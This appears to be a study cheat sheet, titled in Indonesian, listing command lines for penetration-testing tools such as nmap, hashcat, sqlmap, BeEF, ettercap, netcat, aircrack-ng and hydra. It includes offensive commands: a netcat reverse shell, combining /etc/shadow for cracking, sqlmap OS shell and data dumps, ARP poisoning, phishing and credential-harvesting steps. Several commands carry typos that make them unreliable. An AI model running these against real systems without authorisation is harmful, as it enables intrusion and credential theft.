# Daftar Tools untuk diperdalam dan Praktik


## NMAP
The undisputed king of network scanning. It discovers active devices, open ports, and running services across any network. This is your essential first step for mapping a target.

Top 10 Commands:

1. nmap -A -T4 [Target_IP] (Aggressive scan: OS, Service, Script detection)
2. nmap -sS -Pn [Target_IP] (Stealth SYN scan to bypass firewalls)
3. nmap -sU [Target_IP] (UDP port scan for common services)
4. nmap -p- [Target_IP] (Scan all 65535 ports on a target)
5. nmap --script vuln [Target_IP] (Check for known vulnerabilities)
6. nmap -sn 192.168.1.0/24 (Ping sweep to find live hosts)
7. nmap -O [Target_IP] (OS detection for target system)
8. nmap -iL targets.txt (Scan multiple targets from a list)
9. nmap -oA output [Target_IP] (Save all output formats)
10. nmap --traceroute [Target_IP] (Show the network path to the target)

## HASHCAT
The world's fastest password recovery tool, leveraging GPU power for incredible cracking speeds. It supports a vast array of hash types and attack modes, making it indispensable for offline password auditing.
No hash is safe when Hashcat is unleashed.

Top 10 Commands:

1. hashcat -m 0 hash.txt wordlist.txt (Crack MD5 hashes with a wordlist)
2. hashcat -m 1000 hash.txt wordlist.txt (Crack NTLM (Windows) hashes)
3. hashcat -a 3 hash.txt ?I?I?I?I (Brute-force 4-character lowercase passwords)
4. hashcat -I (Display information about your GPU devices)
5. hashcat -b (Benchmark your system's cracking speed)
6. hashcat --show hash.txt (Display successfully cracked passwords)
7. hashcat -m 2500 wpa.hccapx wordlist.txt (Crack WPA/WPA2 handshakes)
8. hashcat -a 1 hash.txt list1.txt list2.txt (Perform a combination attack)
9. hashcat -m 1800 hash.txt wordlist.txt (Crack SHA512 (Linux) hashes)
10. hashcat --session mysession --status (Check cracking status of a session)

## John The Ripper (JTR)
A legendary offline password cracking tool. It can crack encrypted passwords (hashes) using dictionary attacks, rule-based mutations, or brute-force methods.
Supports hundreds of hash formats from ZIP files to Linux system passwords.

Top 10 Commands:

1. john --wordlist=rockyou.txt hashes.txt (Perform a dictionary attack)
2. john --show hashes.txt (Display successfully cracked passwords)
3. zip2john file.zip > hash.txt (Extract hash from a password-protected ZIP file)
4. unshadow /etc/passwd letc/shadow > hashes.txt (Combine passwd/shadow for cracking)
5. john --format=NT hashes.txt (Specify hash format, e.g., Windows NT)
6. john --rules hashes.txt (Use predefined rules for password mutations)
7. john --incremental hashes.txt (Brute-force attack)
8. john --status (Check the progress of a cracking session)
9. john --restore (Resume a previous cracking session)
10. john --single hashes.txt (Try variations based on usernames)

## BEEF (web exploitation)
A powerful penetration testing tool that focuses on exploiting web browsers. By "hooking" a browser, an attacker gains control over the victim's web experience and can execute various client-side commands.

Top 10 Commands/Actions (via Admin UI):

1. beef-xss (Launch the BeEF service)
2. Hook URL: http://your-ip:3000/hook.js (The JavaScript to inject)
3. Command: Get Geolocation (Attempt to get the victim's location)
4. Command: Fake Flash Update (Display a deceptive update prompt)
5. Command: Pretty Theft (Show a fake login popup for credentials)
6. Command: Redirect Browser (Force victim's browser to another URL)
7. Command: Webcam Capture (Attempt to take a picture via webcam)
8. Command: Play Sound (Make the victim's browser play an audio file
9. Command: Get Internal IP (Discover the victim's internal network IP)
10. Command: Social Engineering Popup (Create custom popups for phishing)

## SQL Injection
A powerful open-source tool to automate SQL injection detection and exploitation. It can take over database servers, extract sensitive data, and even gain a shell on the underlying operating system.
The nemesis of insecure web applications.

Top 10 Commands:

1. sqImap -u "[URL]" --dbs (List all available databases)
2. sqlmap -u "[URL]" -D [db_name] --tables (List tables in a database)
3. sqlmap -u "[URL]" -D [db_name] -T [table_name] --dump (Extract data from a table)
4. sqlmap -u "[URL]" --current-user (Identify the database user)
5. sqlmap -u "[URL]" --is-dba (Check if the user is a Database Administrator)
6. sqlmap -u "[URL]" --os-shell (Attempt to get a shell on the OS)
7. sqlmap -u "[URL]" --batch (Automate answers to prompts)
8. sqlmap -u "[URL]" --proxy=http://127.0.0.1:8080 (Route traffic through a proxy like Burp)
9. sqlmap -r request.txt (Use an HTTP request from a file for more complex injections)
10. sqlmap --flush-session (Clear session data for a new scan)

## SOCIAL ENGGINERING TOOLKIT
A powerful framework for automating social engineering attacks. It provides tools for creating sophisticated phishing pages, malicious email campaigns, and infected USB drives. Master the art of human exploitation with SET.

Top 10 Commands/Actions:

1. setoolkit (Launch the SET interactive menu)
2. Social-Engineering Attacks (Select main attack category)
3. Website Attack Vectors (Choose web-based social engineering)
4. Credential Harvester Attack (Setup a page to steal login credentials)
5. Site Cloner (Clone a legitimate website for phishing)
6. Spear-Phishing Attack Vector (Create and send targeted malicious emails)
7. Create a Payload and Listener (Generate a backdoor executable)
8. Mass Mailer Attack (Send bulk emails with attachments)
9. QRcode Generator Attack Vector (Generate a malicious QR code)
10. Update SET (Keep your templates and modules updated)

## ETTERCAP
A comprehensive tool for Man-in-the-Middle (MitM) attacks, network sniffing, and DNS spoofing. It allows you to intercept and modify traffic between two hosts on a local network in real-time. Essential for testing internal network vulnerabilities.

Top 10 Commands:

1. ettercap -G (Launch with a Graphical User Interface)
2. ettercap -T -M arp /192.168.1.1// /192.168.1.5// (ARP poisoning between two hosts)
3. ettercap -P dns_spoof (Enable the DNS spoofing plugin)
4. ettercap -i eth0 (Specify your network interface)
5. ettercap -sniff (Start sniffing network packets)
6. ettercap -w capture.pcap (Save captured traffic to a file)
7. ettercap -o (Display only intercepted usernames and passwords)
8. ettercap -L logfile (Log all detected information)
9. ettercap -u (Stop MitM and restore ARP tables)
10. ettercap -q (Quiet mode, less output to terminal)

## NETCAT
The "Swiss Army Knife" of networking. It reads and writes data across network connections using TCP or UDP. Indispensable for basic network testing, file transfers, and establishing rudimentary shells. Simple, yet incredibly powerful.

Top 10 Commands:

1. nc -Ivp 4444 (Set up a listener on port 4444 for incoming connections)
2. nc [IP] 4444 (Connect to a listener on a specific IP and port)
3. nc -e /bin/bash [IP] 4444 (Establish a reverse shell connection)
4. nc -zv [IP] 1-1000 (Perform a quick port scan on a range)
5. nc -Ip 1234 > file.txt (Receive and save a file from a connection)
6. nc [IP] 1234 < file.txt (Send a file over an active connection)
7. nc -u [IP] 53 (Connect using the UDP protocol)
8. nc -v [IP] 80 (Connect with verbose output for debugging)
9. nc -n [IP] 443 (Connect without DNS resolution for speed)
10. nc -w 5 [IP] 22 (Set a 5-second timeout for the connection)

## DNSENUM
A comprehensive script for gathering DNS-related information about a target. It discovers subdomains, mail servers, name servers, and internal IP ranges.
An essential tool for reconnaissance and expanding your attack surface.

Top 10 Commands:

1. dnsenum [domain] (Perform a full automatic DNS enumeration)
2. dnsenum --enum [domain] (Shortcut for comprehensive enumeration)
3. dnsenum --brute [domain] (Brute-force subdomains using built-in list)
4. dnsenum -f subdomains.txt [domain] (Use a custom wordlist for subdomain brute-force)
5. dnsenum --threads 10 [domain] (Increase concurrency for faster scans)
6. dnsenum -w [domain] (Perform a WHOIS lookup for domain info)
7. dnsenum -o output.xml [domain] (Save results to an XML file)
8. dnsenum --pages 3 [domain] (Scrape subdomains from Google search results)
9. dnsenum --dnsserver [IP] [domain] (Specify a custom DNS server to use)
10. dnsenum --private [domain] (Check for private (RFC 1918) IP ranges)

## DIRB
A web content scanner designed to find hidden web objects (directories and files) on web servers. It performs dictionary-based brute-force attacks against web paths. Crucial for discovering sensitive information, configuration files, and unprotected admin panels.

Top 10 Commands:

1. dirb http://[URL] (Perform a basic directory scan)
2. dirb http://[URL] /usr/share/wordlists/dirb/common.txt (Use a specific wordlist)
3. dirb http://[URL] -X.php,.txt,.config (Scan for multiple file extensions)
4. dirb http://[URL] -i (Perform a case-insensitive scan)
5. dirb http://[URL] -o results.txt (Save the output to a text file)
6. dirb http://[URL] -a "User-Agent-String" (Set a custom User-Agent header)
7. dirb http://[URL] -u admin:password (Scan with HTTP Basic Authentication)
8. dirb http://[URL] -p 127.0.0.1:8080 (Route traffic through a local proxy)
9. dirb http://[URL] -z 100 (Add a 100ms delay between requests)
10. dirb http://[URL] -N 404,403 (Exclude results with specific HTTP status codes)

#VOLATOLITY
The premier open-source memory forensics framework. It analyzes RAM dumps to extract volatile data, revealing system state at the time of compromise. Critical for incident response to find malware, credentials, and network connections.

Top 10 Commands:

1. volatility -f mem.raw imageinfo (Identify the operating system profile)
2. volatility -f mem.raw --profile=[PROFILE] pslist (List running processes)
3. volatility -f mem.raw --profile=[PROFILE] psscan (Find hidden/terminated processes)
4. volatility -f mem.raw --profile=[PROFILE] netscan (View active network connections)
5. volatility -f mem.raw --profile=[PROFILE] hashdump (Extract password hashes from memory)
6. volatility -f mem.raw --profile-[PROFILE] cmdline (View command-line history)
7. volatility -f mem.raw --profile=[PROFILE] malfind (Detect injected malware code)
8. volatility -f mem.raw --profile=[PROFILE] filescan (List open files)
9. volatility -f mem.raw --profile-[PROFILE] screenshot (Reconstruct the screen image)
10. volatility -f mem.raw --profile=[PROFILE] consoles (View console command history)

## REAVER
A dedicated tool for brute-force attacks against Wi-Fi Protected Setup (WPS). It exploits vulnerabilities in the WPS PIN protocol to recover the WPA/WPA2 passphrase in a matter of hours. The most reliable way to crack WPS-enabled Wi-Fi.

Top 10 Commands:

1. reaver -i wlan0mon -b [BSSID] -vv (Start a standard WPS brute- force attack)
2. reaver -i wlan0mon -b [BSSID] -K 1 (Perform a fast Pixie Dust attack if vulnerable)
3. wash -i wlan0mon (Scan for WPS-enabled access points)
4. reaver -i wlan0mon -b [BSSID] -p [PIN] (Test a specific WPS PIN)
5. reaver -i wlan0mon -b [BSSID] -c 6 (Lock to a specific channel)
6. reaver -i wlan0mon -b [BSSID] -d 30 (Add a delay between PIN attempts)
7. reaver -i wlan0mon -b [BSSID] -f (Force attack even if AP appears "locked")
8. reaver -i wlan0mon -b [BSSID] -S (Use small packets for speed)
9. reaver -i wlan0mon -b [BSSID] -N (Don't send NACK packets to the AP)
10. reaver --help (Display all available command-line options)

## BURP SUITE
The ultimate web proxy for intercepting, inspecting, and modifying HTTP/S traffic. It's an essential tool for manual web application penetration testing and bug bounty hunting. Uncover hidden vulnerabilities in web apps with precision.

Top 10 Commands:

1. burpsuite (Launch Burp Suite)
2. Proxy -> Intercept is On/Off (Toggle request interception)
3. Proxy -> HTTP History (Review all past requests and responses)
4. Action -> Send to Repeater (Manually modify and resend requests)
5. Action -> Send to Intruder (Automate customized attacks)
6. Action -> Send to Decoder (Encode/Decode data formats)
7. Target -> Scope (Define which hosts are in-scope for your testing)
8. Scanner -> Scan this host (Perform a basic automated vulnerability scan)
9. Extensions -> BApp Store (Install powerful add-ons)
10. Project options -> Certs (Install Burp's CA cert for HTTPS interception)

## AIRCRACK -NG
A powerful suite for auditing wireless network security. It allows you to crack WPA/WPA2 passwords, deauthenticate users, and test Wi-Fi vulnerabilities.

Top 10 Commands:

1. airmon-ng start wlan0 (Enable monitor mode on your Wi-Fi card)
2. airodump-ng wlan0mon (Scan for all nearby wireless networks)
3. airodump-ng -c 6 --bssid [MAC] -w capture wlan0mon (Capture specific network)
4. aireplay-ng --deauth 0 -a [BSSID] wlan0mon (Deauthenticate all clients from an AP)
5. aircrack-ng -w wordlist.txt capture.cap (Crack WPA handshake using a wordlist)
6. airbase-ng -e "Free WiFi" wlan0mon (Create a fake access point for phishing)
7. airmon-ng stop wlan0mon (Disable monitor mode)
8. airmon-ng check kill (Kill processes interfering with monitor mode)
9. aireplay-ng --test wlan0mon (Test injection capabilities)
10. airdecap-ng -e "MySSID" -p password capture.cap (Decrypt captured traffic)

## KIMSET
A powerful passive wireless network detector, sniffer, and intrusion detection system. It monitors Wi-Fi, Bluetooth, and SDR traffic without being detectable. Essential for auditing wireless environments and identifying potential threats in the air.

Top 10 Commands/Features:

1. kismet (Launch the Kismet server and web UI)
2. kismet -i wlan0mon (Start monitoring on a specific wireless interface)
3. kismet --no-daemon (Run Kismet in the foreground)
4. kismet -t my_scan_log (Set a custom title for the log file)
5. Channel Hopping (Automatically cycle through wireless channels)
6. View -> Devices (Display a list of all detected devices/APs)
7. View -> Alerts (Monitor for suspicious wireless activities, e.g., deauths)
8. Device -> Details (View detailed information about a selected device)
9. kismet_log_to_pcap (Convert Kismet's logs into a pcap file)
10. WIDS (Wireless Intrusion Detection System) (Enable active threat detection)

## HYDRA
A blazing-fast online password cracking tool. It performs brute- force attacks against numerous protocols like SSH, FTP, HTTP forms, and more. Hydra is your go-to for rapidly testing login credentials across various services.

Top 10 Commands:

1. hydra -I admin -P passlist.txt ssh://[IP] (SSH login attack)
2. hydra -L users.txt -P pass.txt [IP] ftp (FTP brute-force with user/pass lists)
3. hydra -I user -P pass.txt [IP] http-get /admin/login.php (HTTP GET attack)
4. hydra -I user -P pass.txt [IP] http-post-form "/login.php:user=^USER^&pass=^PASS^:F=failed" (Web form attack)
5. hydra -t 4 [IP] ssh (Set 4 parallel tasks for SSH)
6. hydra -vV [IP] ssh (Verbose mode to show each attempt)
7. hydra -f [IP] rdp (Stop after the first successful RDP login)
8. hydra -M targets.txt [protocol] (Attack multiple targets from a file)
9. hydra -s 2222 [IP] telnet (Specify a custom port)
10. hydra -I admin -x 4:6:aA1 [IP] ssh (Generate passwords with specific charset and length)

## WIRESHARK
The world's leading network protocol analyzer. It captures and dissects network traffic in real-time, providing deep insights into every packet. Essential for debugging network issues and uncovering suspicious activity.

Top 10 Commands:

1. tshark -i eth0 -w capture.pcap (Capture traffic on eth0 and save)
2. tshark -r capture.pcap -Y "http.request" (Filter saved file for HTTP requests)
3. tshark -V (Display packet details in verbose mode)
4. tshark -f "tcp port 80" (Capture filter for specific port)
5. tshark -c 100 -i eth0 (Capture only the first 100 packets)
6. tshark -z io,phs (Show protocol hierarchy statistics)
7. tshark -T fields -e ip.src -e ip.dst (Extract source and destination IPs)
8. tshark -Y "ip.addr == 192.168.1.1" (Display filter for specific IP)
9. tshark -x (Display packet data in hex and ASCII)
10. tshark -n (Disable name resolution for faster output)

## MALTEGO
A powerful OSINT (Open-Source Intelligence) tool for graphical link analysis. It helps you collect and map relationships between various entities like domains, IPs, email addresses, and social media profiles. Visualize complex attack surfaces and connections.

Top 10 Transforms/Actions (GUI-based):

1. Run Transform: To Domain (Convert entity to associated domain)
2. Run Transform: To IP Address (Resolve domain to IP addresses)
3. Run Transform: To Email Addresses (Extract emails related to a domain)
4. Run Transform: To Social Network Profile (Find social profiles)
5. Run Transform: To DNS Name (Get DNS records like MX, NS)
6. Machine: Footprint L1 (Automated basic reconnaissance)
7. Machine: Footprint L3 (Automated deep reconnaissance)
8. Import Graph from CSV (Import custom data for analysis)
9. Export Graph to Image (Save your visual map as an image)
10. Show Details (View detailed information about an entity)

